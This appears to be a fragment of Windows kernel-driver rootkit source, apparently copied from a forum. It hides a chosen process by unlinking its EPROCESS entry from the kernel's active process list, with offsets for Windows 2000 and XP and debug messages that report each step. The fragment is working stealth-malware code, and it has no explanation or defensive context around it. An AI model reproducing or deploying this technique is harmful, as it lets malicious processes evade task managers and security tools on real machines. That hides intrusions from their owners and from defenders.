if(PsLookupProcessByProcessId((PVOID)hps->uPid, &pEProc) == STATUS_SUCCESS){ //get EPROCESSstruct for the process we want to hide
    DbgPrint("EPROCESS found. Address: %08lX.\n", pEProc);
    DbgPrint("Now hiding process %d...\n", hps->uPid);
    dwEProcAddr = (ULONG) pEProc; //get address of process's EPROCESS struct
    __try{ //try/except just in case, so we don't get a BSOD
        pListProcs = (PLIST_ENTRY) (dwEProcAddr + hps->uFlinkOffset); //pListProcs is a LIST_ENTRY struct, which is set to the LIST_ENTRY struct
                                                                          //in the process being hidden (uLinkOffset varies between 2k and XP)
        *((ULONG*) pListProcs->Blink) = (ULONG) (pListProcs->Flink);   //set flink of prev proc to flink of cur proc
        *((ULONG*) pListProcs->Flink+1) = (ULONG) (pListProcs->Blink); //set blink of next proc to blink of cur proc
        pListProcs->Flink = (PLIST_ENTRY) &(pListProcs->Flink); //set flink and blink of cur proc to themselves
        pListProcs->Blink = (PLIST_ENTRY) &(pListProcs->Flink); //otherwise might bsod when exiting process
        DbgPrint("Process now hidden.\n");
    }__except(EXCEPTION_EXECUTE_HANDLER){
        NtStatus = GetExceptionCode();
        DbgPrint("Exception: %d.\n", NtStatus);
    }
    NtStatus = STATUS_SUCCESS;
}

// Original code from the forum, unedited and untouched; none of this was modified in any way by me.
